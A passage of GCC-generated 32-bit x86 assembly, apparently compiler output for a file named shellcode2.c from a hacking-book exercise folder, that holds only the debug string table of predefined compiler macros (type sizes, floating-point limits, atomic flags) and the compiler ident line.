	.string	"__pentiumpro 1"
.LASF159:
	.string	"__FLT_HAS_DENORM__ 1"
.LASF221:
	.string	"__FLT128_MIN_EXP__ (-16381)"
.LASF136:
	.string	"__UINT_FAST16_MAX__ 0xffffffffU"
.LASF139:
	.string	"__INTPTR_MAX__ 0x7fffffff"
.LASF104:
	.string	"__UINT16_MAX__ 0xffff"
.LASF260:
	.string	"__FLT64X_HAS_QUIET_NAN__ 1"
.LASF42:
	.string	"__INT8_TYPE__ signed char"
.LASF30:
	.string	"__BYTE_ORDER__ __ORDER_LITTLE_ENDIAN__"
.LASF85:
	.string	"__LONG_WIDTH__ 32"
.LASF235:
	.string	"__FLT32X_MIN_EXP__ (-1021)"
.LASF31:
	.string	"__FLOAT_WORD_ORDER__ __ORDER_LITTLE_ENDIAN__"
.LASF121:
	.string	"__UINT_LEAST16_MAX__ 0xffff"
.LASF302:
	.string	"__PRAGMA_REDEFINE_EXTNAME 1"
.LASF51:
	.string	"__INT_LEAST16_TYPE__ short int"
.LASF59:
	.string	"__INT_FAST16_TYPE__ int"
.LASF91:
	.string	"__INTMAX_MAX__ 0x7fffffffffffffffLL"
.LASF308:
	.string	"i386 1"
.LASF306:
	.string	"__i386 1"
.LASF238:
	.string	"__FLT32X_MAX_10_EXP__ 308"
.LASF158:
	.string	"__FLT_DENORM_MIN__ 1.40129846432481707092372958328991613e-45F"
.LASF190:
	.string	"__LDBL_HAS_QUIET_NAN__ 1"
.LASF22:
	.string	"__SIZEOF_DOUBLE__ 8"
.LASF60:
	.string	"__INT_FAST32_TYPE__ int"
.LASF103:
	.string	"__UINT8_MAX__ 0xff"
.LASF108:
	.string	"__INT8_C(c) c"
.LASF322:
	.string	"__linux 1"
.LASF52:
	.string	"__INT_LEAST32_TYPE__ int"
.LASF195:
	.string	"__FLT32_MAX_EXP__ 128"
.LASF312:
	.string	"__ATOMIC_HLE_RELEASE 131072"
.LASF209:
	.string	"__FLT64_MAX_EXP__ 1024"
.LASF140:
	.string	"__INTPTR_WIDTH__ 32"
.LASF90:
	.string	"__SIZE_WIDTH__ 32"
.LASF329:
	.string	"__DECIMAL_BID_FORMAT__ 1"
.LASF293:
	.string	"__GCC_ATOMIC_CHAR32_T_LOCK_FREE 2"
.LASF314:
	.string	"__i686 1"
.LASF66:
	.string	"__INTPTR_TYPE__ int"
.LASF38:
	.string	"__UINTMAX_TYPE__ long long unsigned int"
.LASF98:
	.string	"__SIG_ATOMIC_WIDTH__ 32"
.LASF138:
	.string	"__UINT_FAST64_MAX__ 0xffffffffffffffffULL"
.LASF178:
	.string	"__LDBL_MIN_EXP__ (-16381)"
.LASF19:
	.string	"__SIZEOF_LONG_LONG__ 8"
.LASF149:
	.string	"__FLT_DIG__ 6"
.LASF172:
	.string	"__DBL_DENORM_MIN__ ((double)4.94065645841246544176568792868221372e-324L)"
.LASF13:
	.string	"__ATOMIC_RELEASE 3"
.LASF153:
	.string	"__FLT_MAX_10_EXP__ 38"
.LASF335:
	.string	"unsigned int"
.LASF79:
	.string	"__WINT_MIN__ 0U"
.LASF262:
	.string	"__DEC32_MIN_EXP__ (-94)"
.LASF333:
	.string	"__STDC_ISO_10646__ 201706L"
.LASF71:
	.string	"__SCHAR_MAX__ 0x7f"
.LASF199:
	.string	"__FLT32_MIN__ 1.17549435082228750796873653722224568e-38F32"
.LASF106:
	.string	"__UINT64_MAX__ 0xffffffffffffffffULL"
.LASF6:
	.string	"__GNUC_MINOR__ 3"
.LASF255:
	.string	"__FLT64X_MIN__ 3.36210314311209350626267781732175260e-4932F64x"
.LASF146:
	.string	"__DEC_EVAL_METHOD__ 2"
.LASF265:
	.string	"__DEC32_MAX__ 9.999999E96DF"
.LASF75:
	.string	"__LONG_LONG_MAX__ 0x7fffffffffffffffLL"
.LASF290:
	.string	"__GCC_ATOMIC_BOOL_LOCK_FREE 2"
.LASF231:
	.string	"__FLT128_HAS_INFINITY__ 1"
.LASF130:
	.string	"__INT_FAST16_WIDTH__ 32"
.LASF191:
	.string	"__FLT32_MANT_DIG__ 24"
.LASF143:
	.string	"__GCC_IEC_559_COMPLEX 2"
.LASF161:
	.string	"__FLT_HAS_QUIET_NAN__ 1"
.LASF102:
	.string	"__INT64_MAX__ 0x7fffffffffffffffLL"
.LASF150:
	.string	"__FLT_MIN_EXP__ (-125)"
.LASF323:
	.string	"__linux__ 1"
.LASF241:
	.string	"__FLT32X_MIN__ 2.22507385850720138309023271733240406e-308F32x"
.LASF23:
	.string	"__SIZEOF_LONG_DOUBLE__ 12"
.LASF28:
	.string	"__ORDER_BIG_ENDIAN__ 4321"
.LASF39:
	.string	"__CHAR16_TYPE__ short unsigned int"
.LASF179:
	.string	"__LDBL_MIN_10_EXP__ (-4931)"
.LASF300:
	.string	"__GCC_ATOMIC_POINTER_LOCK_FREE 2"
.LASF257:
	.string	"__FLT64X_DENORM_MIN__ 3.64519953188247460252840593361941982e-4951F64x"
.LASF37:
	.string	"__INTMAX_TYPE__ long long int"
.LASF184:
	.string	"__LDBL_MAX__ 1.18973149535723176502126385303097021e+4932L"
.LASF20:
	.string	"__SIZEOF_SHORT__ 2"
.LASF156:
	.string	"__FLT_MIN__ 1.17549435082228750796873653722224568e-38F"
.LASF296:
	.string	"__GCC_ATOMIC_INT_LOCK_FREE 2"
.LASF217:
	.string	"__FLT64_HAS_INFINITY__ 1"
.LASF111:
	.string	"__INT16_C(c) c"
.LASF259:
	.string	"__FLT64X_HAS_INFINITY__ 1"
.LASF182:
	.string	"__DECIMAL_DIG__ 21"
.LASF152:
	.string	"__FLT_MAX_EXP__ 128"
.LASF272:
	.string	"__DEC64_MAX__ 9.999999999999999E384DD"
.LASF129:
	.string	"__INT_FAST16_MAX__ 0x7fffffff"
.LASF73:
	.string	"__INT_MAX__ 0x7fffffff"
.LASF230:
	.string	"__FLT128_HAS_DENORM__ 1"
.LASF298:
	.string	"__GCC_ATOMIC_LLONG_LOCK_FREE 2"
.LASF227:
	.string	"__FLT128_MIN__ 3.36210314311209350626267781732175260e-4932F128"
.LASF337:
	.string	"GNU C11 7.3.1 20180712 (Red Hat 7.3.1-6) -m32 -mtune=generic -march=i686 -ggdb3 -fno-stack-protector"
.LASF7:
	.string	"__GNUC_PATCHLEVEL__ 1"
.LASF194:
	.string	"__FLT32_MIN_10_EXP__ (-37)"
.LASF324:
	.string	"linux 1"
.LASF168:
	.string	"__DBL_DECIMAL_DIG__ 17"
.LASF163:
	.string	"__DBL_DIG__ 15"
.LASF154:
	.string	"__FLT_DECIMAL_DIG__ 9"
.LASF61:
	.string	"__INT_FAST64_TYPE__ long long int"
.LASF278:
	.string	"__DEC128_MIN__ 1E-6143DL"
.LASF26:
	.string	"__BIGGEST_ALIGNMENT__ 16"
.LASF17:
	.string	"__SIZEOF_INT__ 4"
.LASF45:
	.string	"__INT64_TYPE__ long long int"
.LASF183:
	.string	"__LDBL_DECIMAL_DIG__ 21"
.LASF277:
	.string	"__DEC128_MAX_EXP__ 6145"
.LASF100:
	.string	"__INT16_MAX__ 0x7fff"
.LASF288:
	.string	"__GCC_HAVE_SYNC_COMPARE_AND_SWAP_4 1"
.LASF307:
	.string	"__i386__ 1"
.LASF270:
	.string	"__DEC64_MAX_EXP__ 385"
.LASF84:
	.string	"__INT_WIDTH__ 32"
.LASF148:
	.string	"__FLT_MANT_DIG__ 24"
.LASF95:
	.string	"__INTMAX_WIDTH__ 64"
.LASF5:
	.string	"__GNUC__ 7"
.LASF196:
	.string	"__FLT32_MAX_10_EXP__ 38"
.LASF35:
	.string	"__WCHAR_TYPE__ long int"
.LASF332:
	.string	"__STDC_IEC_559_COMPLEX__ 1"
.LASF43:
	.string	"__INT16_TYPE__ short int"
.LASF295:
	.string	"__GCC_ATOMIC_SHORT_LOCK_FREE 2"
.LASF133:
	.string	"__INT_FAST64_MAX__ 0x7fffffffffffffffLL"
.LASF233:
	.string	"__FLT32X_MANT_DIG__ 53"
.LASF318:
	.string	"__code_model_32__ 1"
.LASF109:
	.string	"__INT_LEAST8_WIDTH__ 8"
.LASF9:
	.string	"__GNUC_RH_RELEASE__ 6"
.LASF58:
	.string	"__INT_FAST8_TYPE__ signed char"
.LASF166:
	.string	"__DBL_MAX_EXP__ 1024"
.LASF141:
	.string	"__UINTPTR_MAX__ 0xffffffffU"
.LASF200:
	.string	"__FLT32_EPSILON__ 1.19209289550781250000000000000000000e-7F32"
.LASF240:
	.string	"__FLT32X_MAX__ 1.79769313486231570814527423731704357e+308F32x"
.LASF144:
	.string	"__FLT_EVAL_METHOD__ 2"
.LASF273:
	.string	"__DEC64_EPSILON__ 1E-15DD"
.LASF197:
	.string	"__FLT32_DECIMAL_DIG__ 9"
.LASF93:
	.string	"__UINTMAX_MAX__ 0xffffffffffffffffULL"
.LASF113:
	.string	"__INT_LEAST32_MAX__ 0x7fffffff"
.LASF291:
	.string	"__GCC_ATOMIC_CHAR_LOCK_FREE 2"
.LASF280:
	.string	"__DEC128_EPSILON__ 1E-33DL"
.LASF305:
	.string	"__SIZEOF_PTRDIFF_T__ 4"
.LASF155:
	.string	"__FLT_MAX__ 3.40282346638528859811704183484516925e+38F"
.LASF303:
	.string	"__SIZEOF_WCHAR_T__ 4"
.LASF211:
	.string	"__FLT64_DECIMAL_DIG__ 17"
.LASF62:
	.string	"__UINT_FAST8_TYPE__ unsigned char"
.LASF64:
	.string	"__UINT_FAST32_TYPE__ unsigned int"
.LASF328:
	.string	"__ELF__ 1"
.LASF338:
	.string	"shellcode2.c"
.LASF177:
	.string	"__LDBL_DIG__ 18"
.LASF331:
	.string	"__STDC_IEC_559__ 1"
.LASF253:
	.string	"__FLT64X_DECIMAL_DIG__ 21"
.LASF8:
	.string	"__VERSION__ \"7.3.1 20180712 (Red Hat 7.3.1-6)\""
.LASF311:
	.string	"__ATOMIC_HLE_ACQUIRE 65536"
.LASF216:
	.string	"__FLT64_HAS_DENORM__ 1"
.LASF110:
	.string	"__INT_LEAST16_MAX__ 0x7fff"
.LASF251:
	.string	"__FLT64X_MAX_EXP__ 16384"
.LASF275:
	.string	"__DEC128_MANT_DIG__ 34"
.LASF114:
	.string	"__INT32_C(c) c"
.LASF269:
	.string	"__DEC64_MIN_EXP__ (-382)"
.LASF88:
	.string	"__WINT_WIDTH__ 32"
.LASF225:
	.string	"__FLT128_DECIMAL_DIG__ 36"
.LASF77:
	.string	"__WCHAR_MIN__ (-__WCHAR_MAX__ - 1)"
.LASF287:
	.string	"__GCC_HAVE_SYNC_COMPARE_AND_SWAP_2 1"
.LASF180:
	.string	"__LDBL_MAX_EXP__ 16384"
.LASF248:
	.string	"__FLT64X_DIG__ 18"
.LASF234:
	.string	"__FLT32X_DIG__ 15"
.LASF244:
	.string	"__FLT32X_HAS_DENORM__ 1"
.LASF40:
	.string	"__CHAR32_TYPE__ unsigned int"
.LASF92:
	.string	"__INTMAX_C(c) c ## LL"
.LASF198:
	.string	"__FLT32_MAX__ 3.40282346638528859811704183484516925e+38F32"
.LASF80:
	.string	"__PTRDIFF_MAX__ 0x7fffffff"
.LASF208:
	.string	"__FLT64_MIN_10_EXP__ (-307)"
.LASF50:
	.string	"__INT_LEAST8_TYPE__ signed char"
.LASF122:
	.string	"__UINT16_C(c) c"
.LASF72:
	.string	"__SHRT_MAX__ 0x7fff"
.LASF21:
	.string	"__SIZEOF_FLOAT__ 4"
.LASF187:
	.string	"__LDBL_DENORM_MIN__ 3.64519953188247460252840593361941982e-4951L"
.LASF167:
	.string	"__DBL_MAX_10_EXP__ 308"
.LASF229:
	.string	"__FLT128_DENORM_MIN__ 6.47517511943802511092443895822764655e-4966F128"
.LASF0:
	.string	"__STDC__ 1"
.LASF29:
	.string	"__ORDER_PDP_ENDIAN__ 3412"
.LASF27:
	.string	"__ORDER_LITTLE_ENDIAN__ 1234"
.LASF36:
	.string	"__WINT_TYPE__ unsigned int"
.LASF55:
	.string	"__UINT_LEAST16_TYPE__ short unsigned int"
.LASF53:
	.string	"__INT_LEAST64_TYPE__ long long int"
.LASF10:
	.string	"__ATOMIC_RELAXED 0"
.LASF16:
	.string	"__FINITE_MATH_ONLY__ 0"
.LASF78:
	.string	"__WINT_MAX__ 0xffffffffU"
.LASF261:
	.string	"__DEC32_MANT_DIG__ 7"
.LASF142:
	.string	"__GCC_IEC_559 2"
.LASF321:
	.string	"__gnu_linux__ 1"
.LASF243:
	.string	"__FLT32X_DENORM_MIN__ 4.94065645841246544176568792868221372e-324F32x"
.LASF239:
	.string	"__FLT32X_DECIMAL_DIG__ 17"
.LASF226:
	.string	"__FLT128_MAX__ 1.18973149535723176508575932662800702e+4932F128"
.LASF320:
	.string	"__SEG_GS 1"
.LASF96:
	.string	"__SIG_ATOMIC_MAX__ 0x7fffffff"
.LASF326:
	.string	"__unix__ 1"
.LASF334:
	.string	"__STDC_NO_THREADS__ 1"
.LASF336:
	.string	"char"
.LASF245:
	.string	"__FLT32X_HAS_INFINITY__ 1"
.LASF219:
	.string	"__FLT128_MANT_DIG__ 113"
.LASF67:
	.string	"__UINTPTR_TYPE__ unsigned int"
.LASF202:
	.string	"__FLT32_HAS_DENORM__ 1"
.LASF147:
	.string	"__FLT_RADIX__ 2"
.LASF205:
	.string	"__FLT64_MANT_DIG__ 53"
.LASF160:
	.string	"__FLT_HAS_INFINITY__ 1"
.LASF309:
	.string	"__SIZEOF_FLOAT80__ 12"
.LASF12:
	.string	"__ATOMIC_ACQUIRE 2"
.LASF86:
	.string	"__LONG_LONG_WIDTH__ 64"
.LASF215:
	.string	"__FLT64_DENORM_MIN__ 4.94065645841246544176568792868221372e-324F64"
.LASF76:
	.string	"__WCHAR_MAX__ 0x7fffffffL"
.LASF137:
	.string	"__UINT_FAST32_MAX__ 0xffffffffU"
.LASF254:
	.string	"__FLT64X_MAX__ 1.18973149535723176502126385303097021e+4932F64x"
.LASF2:
	.string	"__STDC_UTF_16__ 1"
.LASF264:
	.string	"__DEC32_MIN__ 1E-95DF"
.LASF285:
	.string	"__NO_INLINE__ 1"
.LASF34:
	.string	"__PTRDIFF_TYPE__ int"
.LASF188:
	.string	"__LDBL_HAS_DENORM__ 1"
.LASF246:
	.string	"__FLT32X_HAS_QUIET_NAN__ 1"
.LASF68:
	.string	"__has_include(STR) __has_include__(STR)"
.LASF292:
	.string	"__GCC_ATOMIC_CHAR16_T_LOCK_FREE 2"
.LASF131:
	.string	"__INT_FAST32_MAX__ 0x7fffffff"
.LASF282:
	.string	"__REGISTER_PREFIX__ "
.LASF15:
	.string	"__ATOMIC_CONSUME 1"
.LASF281:
	.string	"__DEC128_SUBNORMAL_MIN__ 0.000000000000000000000000000000001E-6143DL"
.LASF3:
	.string	"__STDC_UTF_32__ 1"
.LASF47:
	.string	"__UINT16_TYPE__ short unsigned int"
.LASF252:
	.string	"__FLT64X_MAX_10_EXP__ 4932"
.LASF124:
	.string	"__UINT32_C(c) c ## U"
.LASF46:
	.string	"__UINT8_TYPE__ unsigned char"
.LASF319:
	.string	"__SEG_FS 1"
.LASF267:
	.string	"__DEC32_SUBNORMAL_MIN__ 0.000001E-95DF"
.LASF70:
	.string	"__GXX_ABI_VERSION 1011"
.LASF271:
	.string	"__DEC64_MIN__ 1E-383DD"
.LASF25:
	.string	"__CHAR_BIT__ 8"
.LASF97:
	.string	"__SIG_ATOMIC_MIN__ (-__SIG_ATOMIC_MAX__ - 1)"
.LASF134:
	.string	"__INT_FAST64_WIDTH__ 64"
.LASF266:
	.string	"__DEC32_EPSILON__ 1E-6DF"
.LASF279:
	.string	"__DEC128_MAX__ 9.999999999999999999999999999999999E6144DL"
.LASF173:
	.string	"__DBL_HAS_DENORM__ 1"
.LASF201:
	.string	"__FLT32_DENORM_MIN__ 1.40129846432481707092372958328991613e-45F32"
.LASF63:
	.string	"__UINT_FAST16_TYPE__ unsigned int"
.LASF206:
	.string	"__FLT64_DIG__ 15"
.LASF176:
	.string	"__LDBL_MANT_DIG__ 64"
.LASF297:
	.string	"__GCC_ATOMIC_LONG_LOCK_FREE 2"
.LASF169:
	.string	"__DBL_MAX__ ((double)1.79769313486231570814527423731704357e+308L)"
.LASF99:
	.string	"__INT8_MAX__ 0x7f"
.LASF135:
	.string	"__UINT_FAST8_MAX__ 0xff"
.LASF256:
	.string	"__FLT64X_EPSILON__ 1.08420217248550443400745280086994171e-19F64x"
.LASF151:
	.string	"__FLT_MIN_10_EXP__ (-37)"
.LASF299:
	.string	"__GCC_ATOMIC_TEST_AND_SET_TRUEVAL 1"
.LASF224:
	.string	"__FLT128_MAX_10_EXP__ 4932"
.LASF14:
	.string	"__ATOMIC_ACQ_REL 4"
.LASF228:
	.string	"__FLT128_EPSILON__ 1.92592994438723585305597794258492732e-34F128"
.LASF330:
	.string	"_STDC_PREDEF_H 1"
.LASF289:
	.string	"__GCC_HAVE_SYNC_COMPARE_AND_SWAP_8 1"
.LASF128:
	.string	"__INT_FAST8_WIDTH__ 8"
.LASF74:
	.string	"__LONG_MAX__ 0x7fffffffL"
.LASF89:
	.string	"__PTRDIFF_WIDTH__ 32"
.LASF283:
	.string	"__USER_LABEL_PREFIX__ "
.LASF193:
	.string	"__FLT32_MIN_EXP__ (-125)"
.LASF56:
	.string	"__UINT_LEAST32_TYPE__ unsigned int"
.LASF65:
	.string	"__UINT_FAST64_TYPE__ long long unsigned int"
.LASF120:
	.string	"__UINT8_C(c) c"
.LASF220:
	.string	"__FLT128_DIG__ 33"
.LASF54:
	.string	"__UINT_LEAST8_TYPE__ unsigned char"
.LASF118:
	.string	"__INT_LEAST64_WIDTH__ 64"
.LASF286:
	.string	"__GCC_HAVE_SYNC_COMPARE_AND_SWAP_1 1"
.LASF341:
	.string	"main"
.LASF105:
	.string	"__UINT32_MAX__ 0xffffffffU"
.LASF301:
	.string	"__GCC_HAVE_DWARF2_CFI_ASM 1"
.LASF339:
	.string	"/home/mark/Engineering/Programming/GITHUB/Gray-Hat-Hacking/C_code/Chapter_7/x86_64/Shellcode2"
.LASF107:
	.string	"__INT_LEAST8_MAX__ 0x7f"
.LASF125:
	.string	"__UINT_LEAST64_MAX__ 0xffffffffffffffffULL"
.LASF165:
	.string	"__DBL_MIN_10_EXP__ (-307)"
.LASF101:
	.string	"__INT32_MAX__ 0x7fffffff"
.LASF284:
	.string	"__GNUC_STDC_INLINE__ 1"
.LASF210:
	.string	"__FLT64_MAX_10_EXP__ 308"
.LASF207:
	.string	"__FLT64_MIN_EXP__ (-1021)"
	.ident	"GCC: (GNU) 7.3.1 20180712 (Red Hat 7.3.1-6)"
	.section	.note.GNU-stack,"",@progbits
